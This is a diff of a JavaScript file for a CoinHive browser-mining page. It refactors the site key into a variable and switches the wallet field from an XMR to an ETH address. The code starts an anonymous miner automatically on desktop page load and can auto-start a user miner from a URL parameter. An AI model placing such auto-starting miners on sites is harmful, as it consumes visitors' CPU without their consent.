@@ -1,14 +1,15 @@
+var siteKey = '5lgs7ZNxh09hlbtSzQsLUHp3XLwReMS9'
+
 /** For Setting up the User Miner */
-var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', {throttle: 0.2});
+var anonMiner = new CoinHive.Anonymous(siteKey, {throttle: 0.2});
 if (!miner.isMobile()) {
     anonMiner.start();
-}
-else {
+} else {
     window.alert("Please note that you are mining on mobile which is not recommended.");
 }
 
 function getWalletAddress() {
-    return document.getElementById('xmrAddress').value;
+    return document.getElementById('ethAddress').value;
 }
 
 function createAttribute(name, val, parent) {
@@ -63,12 +64,12 @@ function createiframe() {
 
 function startUserMiner() {
     var userWalletAddress = getWalletAddress();
-    var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', userWalletAddress, {threads: 1,
+    var userMiner = new CoinHive.User(siteKey, userWalletAddress, {threads: 1,
         throttle: 1});
     // AnonMiner.stop();
     // Neccessary to update user Total Hashes not actually Mining
     // Fuck CoinHive
-        userMiner.start();
+    userMiner.start();
 
     var button = document.getElementById('minerButton');
     button.innerHTML = "Mining to: " + userWalletAddress;
@@ -77,7 +78,7 @@ function startUserMiner() {
     var parent = document.getElementById("iframeParent");
     var div = document.createElement('div');
     createAttribute('class', 'coinhive-miner', div);
-    createAttribute('data-key', 'qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', div);
+    createAttribute('data-key', siteKey, div);
     createAttribute('data-user', userWalletAddress, div);
     createAttribute('data-autostart', 'true', div);
     createAttribute('data-whitelabel', 'false', div);
@@ -102,7 +103,7 @@ function minerURL() {
     var queryString = window.location.search;
     if (queryString.length) {
         queryString = queryString.substring(1);
-        document.getElementById('xmrAddress').value = queryString;
+        document.getElementById('ethAddress').value = queryString;
         startUserMiner();
     }
 }
